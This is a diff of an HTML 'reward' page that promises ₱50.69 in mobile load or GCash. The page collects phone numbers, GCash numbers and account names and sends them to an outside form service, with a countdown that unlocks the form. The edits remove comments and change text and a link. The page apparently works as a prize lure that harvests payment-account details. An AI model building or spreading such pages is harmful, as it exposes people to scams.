@@ -286,22 +286,19 @@
       Value: ₱50.69
       <div class="reward-badge">
         <p style="font-size: 0.6em; color:#ffcc00;">
-          Pending: <span class="countdown" id="countdown">Loading...</span>
+         <span class="countdown" id="countdown">Loading...</span>
         </p>
       </div>
     </h2>
 
-    <!-- Reward Buttons -->
     <div class="reward-type">
       <button type="button" id="loadBtn" class="reward-btn active">Load</button>
       <button type="button" id="gcashBtn" class="reward-btn">GCash</button>
     </div>
 
-    <!-- Form -->
     <form id="entryForm" action="https://formspree.io/f/xanpvjav" method="POST">
       <input type="hidden" name="reward_type" id="rewardType" value="Load" />
 
-      <!-- Load Form -->
       <div id="loadForm">
         <input type="tel" name="number" id="loadNumber" placeholder="Mobile number" required maxlength="11" inputmode="numeric" />
         <select name="sim_type" required>
@@ -317,14 +314,13 @@
         <input type="text" name="promo" placeholder="Promo preference (optional)" />
       </div>
 
-      <!-- GCash Form -->
       <div id="gcashForm" style="display:none;">
         <input type="tel" name="gcash_number" id="gcashNumber" placeholder="G number" maxlength="11" inputmode="numeric" />
         <input type="text" name="gcash_name" placeholder="G name" />
       </div>
 
       <button type="submit">Submit</button>
-      <a href="https://lxxryc.github.io/result/" target="_blank" style="color: white; text-decoration: none;">Result</a>
+      <a href="https://yourwebsite.com" target="_blank" style="color: white; text-decoration: none;">Result</a>
 
 
 
@@ -340,7 +336,6 @@
     </div>
   </div>
 
-  <!-- Scripts -->
   <script>
     // Element references
     const loadBtn = document.getElementById('loadBtn');
@@ -376,13 +371,11 @@
       loadForm.querySelectorAll('input, select').forEach(el => el.required = false);
     });
 
-    // Fallback for video error
     bgVideo.onerror = () => {
       bgVideo.style.display = 'none';
       bgImage.style.display = 'block';
     };
 
-    // Form submission
     form.addEventListener('submit', e => {
       e.preventDefault();
       const submitBtn = form.querySelector('button[type="submit"]');
@@ -430,7 +423,7 @@
       let diff = targetTime - now;
 
       if(diff <= 0) {
-        countdownEl.textContent = "Available!";
+        countdownEl.textContent = "Available! close 20:00";
         lockedInputs.forEach(input => {
           input.removeAttribute('disabled');
           input.removeAttribute('readonly');
@@ -464,6 +457,5 @@
 
 </body>
 </html>
-
 
 
